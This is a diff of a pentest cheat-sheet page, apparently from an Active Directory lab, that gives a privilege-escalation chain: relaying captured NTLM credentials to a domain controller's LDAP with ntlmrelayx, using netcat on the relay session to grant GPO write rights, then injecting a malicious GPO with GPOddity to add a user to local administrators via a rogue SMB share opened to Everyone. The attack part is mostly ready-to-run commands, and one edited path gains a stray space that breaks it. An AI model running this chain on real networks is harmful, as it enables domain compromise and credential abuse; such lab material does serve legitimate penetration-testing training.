@@ -23,7 +23,7 @@ cme smb <networkIP>/<cidr> --gen-relay-list relayTargets.txt
 
 ### Relaying hashes <a href="#relaying-hashes" id="relaying-hashes"></a>
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption><p>Found from <a href="https://aas-s3curity.gitbook.io/cheatsheet/internalpentest/active-directory/exploitation/exploit-without-account/smb-relay">here</a></p></figcaption></figure>
 
 Create a shortcurt lnk file with the below content  and place it inside th shared AI folder.
 
@@ -37,7 +37,7 @@ Run the below comamnd in the WSL Linux to relay the credentials to the DC.
 sudo ntlmrelayx.py -t ldap://dcorp-dc.dollarcorp.moneycorp.local --http-port '80,8080' -i --no-smb-server
 ```
 
-Use netcat to connect to the interavtive session and use the below to add the user to have write access over the GPO.
+Use netcat to connect to the interactive session and use the below to add the user to have write access to the GPO.
 
 <pre class="language-aspnet"><code class="lang-aspnet"><strong>write_gpo_dacl studentx {0BF8D01C-1F62-4BDC-958C-57140B67D147}
 </strong></code></pre>
@@ -49,7 +49,7 @@ Now malicious GPO template can injected through GPOddity - [https://github.com/s
 </strong><strong># Use the GPOddity
 </strong>sudo python3 gpoddity.py --domain dollarcorp.moneycorp.local --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --username studentx --password xyzdsfsddsf --dc-ip 172.16.2.1 --command "net localgroup administrators studentx  /add" --rogue-smbserver-ip 172.16.100.x --rogue-smbserver-share 'std-anything' --smb-mode none 
 # Create a share with the name mentioned above and host the template
-net share std-anything=C:\AD\Tools\GPOddity\GPT_out
+net share std-anything=C:\AD\Tools\ GPOddity\GPT_out
 # Grant everyone permission to those templates
 icacls "C:\AD\Tools\GPOddity\GPT_out" /grant Everyone:F /T
 # Verify the persmission with
